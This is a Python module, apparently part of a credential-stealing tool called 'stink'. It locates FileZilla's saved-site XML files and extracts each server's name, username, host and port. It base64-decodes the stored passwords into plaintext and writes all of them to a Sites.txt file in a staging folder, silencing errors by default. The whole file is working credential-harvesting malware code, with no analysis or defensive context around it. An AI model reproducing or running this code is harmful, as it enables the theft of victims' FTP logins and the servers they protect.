from base64 import b64decode
from xml.etree import ElementTree
from os import listdir, path, makedirs

from stink.helpers.config import FileZillaConfig


class FileZilla:

    def __init__(self, storage_path: str, folder: str, errors: bool):

        self.__storage_path = storage_path
        self.__folder = folder
        self.__errors = errors

        self.__config = FileZillaConfig()

    def __create_folder(self):

        folder = rf"{self.__storage_path}\{self.__folder}"

        if not path.exists(folder):
            makedirs(folder)

    def __get_sites(self):

        if not path.exists(self.__config.SitesPath):
            return

        files = listdir(self.__config.SitesPath)
        data_files = self.__config.DataFiles

        if not any(file in data_files for file in files):
            return

        self.__create_folder()

        temp = []

        for file in data_files:

            root = ElementTree.parse(rf"{self.__config.SitesPath}\{file}").getroot()
            data = self.__config.FileZillaData

            if not root:
                continue

            for server in root[0].findall("Server"):

                site_name = server.find("Name").text if hasattr(server.find("Name"), "text") else ""
                site_user = server.find("User").text if hasattr(server.find("User"), "text") else ""
                site_pass = server.find("Pass").text if hasattr(server.find("Pass"), "text") else ""
                site_host = server.find("Host").text if hasattr(server.find("Host"), "text") else ""
                site_port = server.find("Port").text if hasattr(server.find("Port"), "text") else ""
                site_pass = b64decode(site_pass).decode("utf-8")

                temp.append(data.format(site_name, site_user, site_pass, site_host, site_port))

        with open(rf"{self.__storage_path}\{self.__folder}\Sites.txt", "a", encoding="utf-8") as file_zilla:
            file_zilla.write("".join(item for item in temp))

    def run(self):

        try:

            self.__get_sites()

        except Exception as e:
            if self.__errors is True: print(f"[FilleZilla]: {repr(e)}")
